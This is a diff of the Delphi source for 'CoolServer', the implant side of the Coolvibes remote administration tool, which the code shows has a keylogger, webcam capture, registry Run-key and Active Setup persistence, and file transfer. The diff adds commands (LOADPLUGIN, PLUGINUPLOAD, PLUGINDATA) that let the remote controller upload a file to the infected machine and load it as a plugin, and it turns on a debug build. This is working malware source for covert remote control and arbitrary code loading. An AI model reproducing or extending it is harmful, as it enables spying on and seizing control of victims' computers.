@@ -12,15 +12,14 @@
 
      El equipo Coolvibes
 *)
-library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
-//program CoolServer; //Para debug, más lineas "Para debug" abajo
+//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
+program CoolServer; //Para debug, más lineas "Para debug" abajo
 
 uses
   Windows,
   SysUtils,
   ShellAPI,
   Classes,
-
   LOMLib in 'LOMLib.pas',
   LOMTask in 'LOMTask.pas',
   MiniReg in 'MiniReg.pas',
@@ -46,7 +45,8 @@ uses
   UnitThreadsCapCamCapture in 'UnitThreadsCapCamCapture.pas',
   UnitTransfer in 'UnitTransfer.pas',
   UnitVariables in 'UnitVariables.pas',
-  UnitWindows in 'UnitWindows.pas';
+  UnitWindows in 'UnitWindows.pas',
+  UnitPlugins in 'UnitPlugins.pas';
 
 var
   SH: Integer; //SocketHandle de la conexión principal
@@ -163,7 +163,7 @@ end;
 procedure Iniciar();
 var
   Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3, TempStr4: AnsiString;
-  Tipo, BotonPulsado, i: Integer;
+  Tipo, BotonPulsado, i, o: Integer;
   TempCardinal: Cardinal;
   Tam: Int64;
   ShellParameters: TShellParameters;
@@ -174,7 +174,7 @@ var
   Port: Integer;
   ThreadSearch: TThreadSearch;
   ThreadCapCam: TThreadCapCam;
-  capiniciada: Boolean;
+  capiniciadam, bool: Boolean;
   MS: TMemoryStream;
   ExitCode: Longword;
 begin
@@ -1172,6 +1172,72 @@ begin
             end;
           //Fin de comandos relacionados con el port escaner;
 
+
+          if Pos('LOADPLUGIN', Recibido) = 1 then //Cargar un plugin
+          begin
+            Delete(Recibido, 1, 11);
+            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Nombre
+            Delete(Recibido, 1, Pos('|', Recibido));
+            i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //ID
+            bool := false;
+            for o:=0 to Plugincount do //miramos a ver si ya está cargado
+              if Plugins[o].Nombre = TempStr then
+              begin
+                SendText('PLUGINLOADED|'+inttostr(o)+'|'+ENTER);  //Estaba cargado
+                bool := true;
+              end;
+
+            if fileexists(extractfilepath(paramstr(0))+TempStr) then
+            begin
+              Plugins[PluginCount].Nombre := TempStr;
+              Plugins[PluginCount].id := i;
+
+              CargarPlugin(PluginCount, sock);
+              Plugincount := Plugincount+1;
+              SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
+            end
+            else  
+            if bool = false then
+            begin
+              SendText('PLUGINUPLOAD|'+inttostr(i)+'|'+ENTER);  //mandamos que nos lo envie
+            end;
+          end;
+
+
+
+          if Pos('PLUGINUPLOAD', Recibido) = 1 then //Cargar un plugin
+          begin
+            Delete(Recibido, 1, 13);
+            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Nombre
+            Delete(Recibido, 1, Pos('|', Recibido));
+            o := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //tamaño
+            Delete(Recibido, 1, Pos('|', Recibido));
+            i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0); //ID
+            Delete(Recibido, 1, Pos('|', Recibido));
+
+            getFile(Sock, extractfilepath(paramstr(0))+TempStr, o, false);
+
+            Plugins[PluginCount].Nombre := TempStr;
+            Plugins[PluginCount].id := i;
+
+
+            CargarPlugin(PluginCount, sock);
+            
+            SendText('PLUGINLOADED|'+inttostr(i)+'|'+ENTER);  //Plugin cargado
+            
+            Plugincount := Plugincount+1;
+          end;
+
+          if Pos('PLUGINDATA', Recibido) = 1 then //Cargar un plugin
+          begin
+            Delete(Recibido, 1, 11);
+            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Nombre
+            Delete(Recibido, 1, Pos('|', Recibido));
+            for i:=0 to Plugincount do
+              if Plugins[i].nombre = TempStr then
+                Plugins[i].Recdata(Recibido);
+          end;
+          
           lastCommandTime := GetTickCount;
           Busy := False;
         end; //while sock.connected do
@@ -1203,7 +1269,7 @@ end; //Fin del OnRead del socket
 procedure CargarServidor(P: Pointer);
 begin
   Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-  VersionDelServer := '1.7';
+  VersionDelServer := '1.8';
   BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
   OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
 
@@ -1218,7 +1284,7 @@ exports CargarServidor;
 
 begin
   //Para debug:
-  {Configuracion.sHosts                 := 'localhost:77¬';
+  Configuracion.sHosts                 := 'localhost:77¬';
   Configuracion.sID                     := 'Coolserver';
   Configuracion.bCopiarArchivo          := False; //Me copio o no?
   Configuracion.sFileNameToCopy         := 'coolserver.exe';
@@ -1229,7 +1295,7 @@ begin
   Configuracion.sRunRegKeyName          := 'Coolserver';
   Configuracion.bArranqueActiveSetup    := False;
   Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
-  CargarServidor(@configuracion);}
+  CargarServidor(@configuracion);
   //Fin de Para debug
 end.
 
